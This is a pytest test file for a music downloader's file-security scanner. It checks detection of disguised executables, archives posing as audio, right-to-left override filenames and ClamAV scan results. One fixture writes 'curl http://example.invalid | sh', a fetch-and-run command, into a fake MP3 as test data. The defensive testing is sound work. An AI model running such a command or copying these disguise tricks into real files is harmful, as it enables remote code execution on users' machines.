import shutil
import subprocess
import zipfile
from pathlib import Path

import pytest

from cratedigger.core import security
from cratedigger.core.security import EngineInfo, name_risks, scan_file, structural_check


@pytest.fixture(scope="module")
def samples(tmp_path_factory):
    d = tmp_path_factory.mktemp("sec")
    subprocess.run(["ffmpeg", "-v", "error", "-f", "lavfi", "-i", "sine=f=440:d=3", "-b:a", "320k", str(d / "good.mp3")],
                   check=True)
    subprocess.run(["ffmpeg", "-v", "error", "-f", "lavfi", "-i", "sine=f=440:d=3", str(d / "good.flac")], check=True)
    shutil.copy("/bin/ls", d / "macho.mp3")                               # real Mach-O program, renamed
    with zipfile.ZipFile(d / "zip.flac", "w") as z:                         # archive disguised as audio
        z.writestr("Track.app/Contents/MacOS/x", "#!/bin/sh\necho hi\n")
    (d / "script.mp3").write_text("#!/bin/sh\ncurl http://example.invalid | sh\n")
    good = (d / "good.mp3").read_bytes()
    (d / "embedded.mp3").write_bytes(good[:4000] + b"MZ\x90\x00" + b"\x00" * 60 + security.DOS_STUB + good[4000:])
    (d / "html.wav").write_text("<html><script>alert(1)</script></html>")
    (d / "Track.mp3.app").mkdir()
    (d / "link.mp3").symlink_to(d / "good.mp3")
    return d


def test_structural_detects_threats(samples):
    assert structural_check(samples / "good.mp3") == []
    assert structural_check(samples / "good.flac") == []
    assert any("macOS" in t for t in structural_check(samples / "macho.mp3"))
    assert any("ZIP" in t for t in structural_check(samples / "zip.flac"))
    assert any("shebang" in t for t in structural_check(samples / "script.mp3"))
    assert any("embedded Windows executable" in t for t in structural_check(samples / "embedded.mp3"))
    assert any("markup" in t for t in structural_check(samples / "html.wav"))
    assert structural_check(samples / "Track.mp3.app")  # bundle / not a regular file
    assert any("symbolic link" in t for t in structural_check(samples / "link.mp3"))


def test_name_risks():
    assert name_risks("@@u\\Music\\Artist - Track.mp3") == []
    assert name_risks("Mala - Anti War Dub (Kahn Remix).flac") == []
    assert name_risks("D.A.N - I Want Ya.flac") == []
    assert name_risks("Track.mp3.exe")
    assert name_risks("Trustee - Robbery (Original Mix) - www.djsoundtop.com.mp3") == []
    assert name_risks("Track.mp3.app")
    assert name_risks("Track‮3pm.exe")       # right-to-left override disguise
    assert name_risks("Artist - Track.mp3.zip")


def _fake_engine(tmp_path, rc, out):
    exe = tmp_path / f"fakeclam{rc}"
    exe.write_text(f"#!/bin/sh\necho '{out}'\nexit {rc}\n")
    exe.chmod(0o755)
    return EngineInfo(True, engine=str(exe), version="1.5.4", db_version="27801", db_date="Wed Nov 18 2026",
                      db_age_days=0.5, message="fake")


def test_scan_policy(samples, tmp_path, monkeypatch):
    # No ClamAV -> unscanned (never approvable), even for a structurally fine file
    monkeypatch.setattr(security, "engine_info", lambda refresh=False: EngineInfo(False, message="not installed"))
    r = scan_file(samples / "good.mp3")
    assert r.status == "unscanned" and not r.safe
    # ClamAV clean + structure fine -> clean
    monkeypatch.setattr(security, "engine_info", lambda refresh=False: _fake_engine(tmp_path, 0, "OK"))
    assert scan_file(samples / "good.mp3").safe
    # ClamAV clean but structure bad -> suspicious
    r = scan_file(samples / "macho.mp3")
    assert r.status == "suspicious" and not r.safe
    # ClamAV infected
    monkeypatch.setattr(security, "engine_info",
                        lambda refresh=False: _fake_engine(tmp_path, 1, "x.mp3: Eicar-Test-Signature FOUND"))
    r = scan_file(samples / "good.mp3")
    assert r.status == "infected" and "Eicar-Test-Signature" in r.threats[0]


def test_daily_update_runs_once_per_day(tmp_path, monkeypatch):
    from cratedigger.core import config
    calls = []
    fake = tmp_path / "freshclam"
    fake.write_text(f"#!/bin/sh\necho run >> {tmp_path}/calls\nexit 0\n")
    fake.chmod(0o755)
    monkeypatch.setattr(config, "APP_DIR", tmp_path)
    monkeypatch.setattr(security, "_which", lambda n: str(fake) if n == "freshclam" else None)
    r1 = security.update_signatures_if_new_day()
    r2 = security.update_signatures_if_new_day()
    assert r1.ran and r1.ok and security.signatures_updated_today()
    assert not r2.ran  # second fetch the same day: no update
    assert (tmp_path / "calls").read_text().count("run") == 1
    # A new day -> runs again
    (tmp_path / "av_update.json").write_text('{"last_success_date": "2000-01-01"}')
    assert security.update_signatures_if_new_day().ran
    # Failure (e.g. offline) is reported, not recorded as today's success
    fake.write_text("#!/bin/sh\necho 'Can not connect' ; exit 52\n")
    (tmp_path / "av_update.json").write_text('{"last_success_date": "2000-01-01"}')
    r = security.update_signatures_if_new_day()
    assert r.ran and not r.ok and not security.signatures_updated_today()


def test_daily_update_happens_before_search(tmp_path, monkeypatch):
    """The service refreshes definitions before queuing a user search (not before automatic fallbacks)."""
    from cratedigger.core import service as svc_mod
    from cratedigger.core.bridge import NicotineBridge
    from cratedigger.core.config import Settings
    from cratedigger.core.db import Database
    from cratedigger.core.security import UpdateResult
    order = []
    monkeypatch.setattr(svc_mod, "update_signatures_if_new_day",
                        lambda force=False: order.append("update") or UpdateResult(True, True, "ok"))
    bridge = NicotineBridge(tmp_path / "b", tmp_path / "p")
    orig = bridge.search
    bridge.search = lambda *a, **k: order.append("search") or orig(*a, **k)
    db = Database(tmp_path / "d.sqlite3")
    s = svc_mod.Service(db, Settings(), bridge)
    db.exec("INSERT INTO tracks(title, artists, duration_ms) VALUES ('Alma','JottaFrank',208744)")
    s.queue_search([1])
    assert order == ["update", "search"]
